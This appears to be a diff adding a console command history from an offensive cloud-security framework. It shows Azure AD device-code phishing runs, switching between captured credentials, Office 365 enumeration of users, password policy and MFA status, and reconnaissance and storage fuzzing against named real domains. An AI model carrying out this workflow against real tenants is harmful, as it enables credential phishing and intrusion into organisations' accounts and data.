+# 2023-08-21 11:29:40.385530
++use module exploit/azuread_device_code_phish
+
+# 2023-08-21 11:29:41.273620
++run
+
+# 2023-08-21 11:30:00.449183
++set REFRESH true
+
+# 2023-08-21 11:30:02.269446
++run
+
+# 2023-08-21 11:30:10.883669
++use credentials pVRUfciLAy
+
+# 2023-08-21 11:30:16.773911
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 11:30:17.549866
++run
+
+# 2023-08-21 11:30:28.914827
++use module enum/office365_get_user_list
+
+# 2023-08-21 11:30:29.609186
++run
+
+# 2023-08-21 11:30:48.669097
++use module exploit/azuread_device_code_phish
+
+# 2023-08-21 11:31:00.802137
++set CLIENT-ID 1b730954-1685-4b74-9bfd-dac224a7b894
+
+# 2023-08-21 11:31:02.204079
++run
+
+# 2023-08-21 11:31:06.398264
++options
+
+# 2023-08-21 11:31:22.909210
++use module exploit/azuread_device_code_phish
+
+# 2023-08-21 11:31:24.635498
++set CLIENT-ID 1b730954-1685-4b74-9bfd-dac224a7b894
+
+# 2023-08-21 11:31:25.736124
++run
+
+# 2023-08-21 11:31:47.466949
++set REFRESH true
+
+# 2023-08-21 11:31:48.152086
++run
+
+# 2023-08-21 11:31:55.520721
++use credentials fn6Cl4Fkkx
+
+# 2023-08-21 11:31:56.626903
++run
+
+# 2023-08-21 11:32:03.589855
++use module enum/office365_get_user_list
+
+# 2023-08-21 11:32:05.278352
++run
+
+# 2023-08-21 11:32:13.430492
++use credentials fn6Cl4Fkkx
+
+# 2023-08-21 11:32:14.659841
++use module enum/office365_get_user_list
+
+# 2023-08-21 11:32:16.077973
++run
+
+# 2023-08-21 11:32:44.900414
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 11:32:48.172550
++set AADOBJECT users
+
+# 2023-08-21 11:32:48.887786
++run
+
+# 2023-08-21 11:33:24.881718
++set AADOBJECT all
+
+# 2023-08-21 11:33:25.623722
++run
+
+# 2023-08-21 11:40:26.233189
++use module enum/office365_get_user_passsword_policy
+
+# 2023-08-21 11:40:33.879677
++use credentials fn6Cl4Fkkx
+
+# 2023-08-21 11:40:35.269540
++run
+
+# 2023-08-21 11:42:21.617989
++use credentials fn6Cl4Fkkx
+
+# 2023-08-21 11:42:22.916877
++use module enum/office365_get_user_passsword_policy
+
+# 2023-08-21 11:42:24.465224
++run
+
+# 2023-08-21 11:52:00.538741
++use credentials fn6Cl4Fkkx
+
+# 2023-08-21 11:52:01.905759
++use module enum/office365_get_user_passsword_policy
+
+# 2023-08-21 11:52:03.284818
++run
+
+# 2023-08-21 12:11:15.480310
++use module enum/office365_get_user_passsword_policy
+
+# 2023-08-21 12:11:16.720970
++use credentials fn6Cl4Fkkx
+
+# 2023-08-21 12:11:18.022378
++run
+
+# 2023-08-21 12:12:24.487704
++use module enum/office365_enum_aad_objects
+
+# 2023-08-21 12:12:25.302196
++run
+
+# 2023-08-25 17:31:40.210281
++use module enum/office365_list_users
+
+# 2023-08-25 17:31:55.728959
++use credentials fn6Cl4Fkkx
+
+# 2023-08-25 17:31:57.188644
++run
+
+# 2023-08-25 17:32:42.110569
++use module exploit/azuread_device_code_phish
+
+# 2023-08-25 17:32:43.758574
++options
+
+# 2023-08-25 17:32:52.834314
++set CLIENT-ID 1b730954-1685-4b74-9bfd-dac224a7b894
+
+# 2023-08-25 17:32:54.141355
++run
+
+# 2023-08-25 17:33:21.054849
++set REFRESH true
+
+# 2023-08-25 17:33:21.925529
++run
+
+# 2023-08-25 17:33:52.978157
++use credentials AzHeptxiEg
+
+# 2023-08-25 17:33:54.195563
++run
+
+# 2023-08-25 17:34:06.253714
++use module enum/office365_list_users
+
+# 2023-08-25 17:34:07.855610
++run
+
+# 2023-08-25 17:34:14.624849
++use credentials AzHeptxiEg
+
+# 2023-08-25 17:34:19.951655
++show current-creds
+
+# 2023-08-25 17:34:43.018813
++use credentials AzHeptxiEg
+
+# 2023-08-25 17:34:47.143906
++show credentials
+
+# 2023-08-25 17:35:54.061094
++use credentials AzHeptxiEg
+
+# 2023-08-25 17:36:02.076574
++use module enum/office365_list_users
+
+# 2023-08-25 17:36:03.404543
++run
+
+# 2023-08-25 17:37:03.541995
++use module enum/office365_list_users
+
+# 2023-08-25 17:37:05.555995
++use credentials AzHeptxiEg
+
+# 2023-08-25 17:37:07.080004
++run
+
+# 2023-08-25 17:43:53.898684
++use credentials AzHeptxiEg
+
+# 2023-08-25 17:43:55.271003
++use module enum/office365_list_users
+
+# 2023-08-25 17:44:01.415629
++use module enum/office365_list_mfa_status_for_users
+
+# 2023-08-25 17:44:02.871304
++run
+
+# 2023-08-25 17:44:26.954847
++use module enum/office365_list_mfa_status_for_users
+
+# 2023-08-25 17:44:30.191991
++use credentials AzHeptxiEg
+
+# 2023-08-25 17:44:31.601804
++run
+
+# 2023-08-25 17:54:05.550512
++use module reconnaissance/misc_crtsh
+
+# 2023-08-25 17:54:12.226533
++show op
+
+# 2023-08-25 17:54:16.362145
++options
+
+# 2023-08-25 17:54:21.642702
++set domain xitaso.com
+
+# 2023-08-25 17:54:22.596903
++run
+
+# 2023-08-28 10:51:32.625984
++use module reconnaissance/azure_check_azure_usage
+
+# 2023-08-28 10:51:36.210415
++set domain upt.al
+
+# 2023-08-28 10:51:37.888622
++run
+
+# 2023-08-28 10:52:00.940784
++use module reconnaissance/azuread_unauth_user_enum
+
+# 2023-08-28 10:52:02.192543
++options
+
+# 2023-08-28 10:52:08.803205
++set EMAIL info@upt.al
+
+# 2023-08-28 10:52:09.904303
++run
+
+# 2023-08-29 10:31:15.254955
++use module reconnaissance/azure_check_azure_usage
+
+# 2023-08-29 10:31:21.180967
++set DOMAIN xitaso.com
+
+# 2023-08-29 10:31:22.829172
++run
+
+# 2023-08-30 08:39:20.046553
++use module reconnaissance/azure_fuzz_storages
+
+# 2023-08-30 08:39:22.149775
++options
+
+# 2023-08-30 08:39:29.102778
++set storage-name aasdata
+
+# 2023-08-30 08:39:30.534255
++run
+
+# 2023-08-30 08:55:10.682223
++cat ./workspaces/xitaso/30_08_2023_08_39_30_ec2_enum_instances
+
+# 2023-08-30 08:55:21.616175
++ls
+
+# 2023-08-30 08:55:23.115188
++options
+
+# 2023-08-30 08:55:34.839482
++run
+
+# 2023-08-30 08:57:28.032428
++use module reconnaissance/azure_service_dns_fuzzer
+
+# 2023-08-30 08:57:29.288912
++options
+
+# 2023-08-30 08:57:48.862687
++set basename aasdata
+
+# 2023-08-30 08:57:51.527129
++set COUNTRY_CODE DE
+
+# 2023-08-30 08:57:52.332891
++run
+
+# 2023-08-30 08:58:20.321434
++set DOMAIN xitasogbmh.com
+
+# 2023-08-30 08:58:21.062215
++run
+
+# 2023-08-30 08:58:24.885878
++unset BASENAME
+
+# 2023-08-30 08:58:25.973399
++run
+
+# 2023-08-30 09:13:18.937625
++unset domain
+
+# 2023-08-30 09:13:23.725919
++set BASENAME aasdata.blob.core.windows.net
+
+# 2023-08-30 09:13:32.441474
++set BASENAME mnestixautomaticasa
+
+# 2023-08-30 09:13:33.627716
++run
